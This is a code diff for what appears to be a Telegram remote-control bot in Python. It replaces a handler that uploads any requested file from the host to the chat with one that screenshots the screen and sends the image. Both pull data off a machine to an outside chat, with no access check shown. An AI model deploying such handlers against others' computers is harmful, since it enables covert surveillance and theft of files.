@@ -20,28 +20,27 @@
 #  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 #  SOFTWARE.
 
-import os
+import pyautogui
+from datetime import datetime
+from io import BytesIO
 from telegram import Update
 from telegram.ext import ContextTypes
 
-async def cmd_uploadfile(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Upload a file"""
-    if not context.args:
-        await update.message.reply_text("Usage: `/uploadfile /path/to/file`")
-        return
-
-    file_path = " ".join(context.args)
-
-    if not os.path.exists(file_path):
-        await update.message.reply_text(f"File not found: {file_path}")
-        return
-
+async def cmd_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Screenshot current window"""
     try:
-        with open(file_path, 'rb') as file:
+        screenshot = pyautogui.screenshot()
+
+        screenshot_filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
+        
+        with BytesIO() as byte_io:
+            screenshot.save(byte_io, format="PNG")
+            byte_io.seek(0)
             await context.bot.send_document(
                 chat_id=update.effective_chat.id,
-                document=file,
-                filename=os.path.basename(file_path)
+                document=byte_io,
+                filename=screenshot_filename
             )
     except Exception as e:
-        await update.message.reply_text(f"An error occurred while uploading the file: {str(e)}")
+        await update.message.reply_text(f"⚠️ Error screenshot: {str(e)}")
+
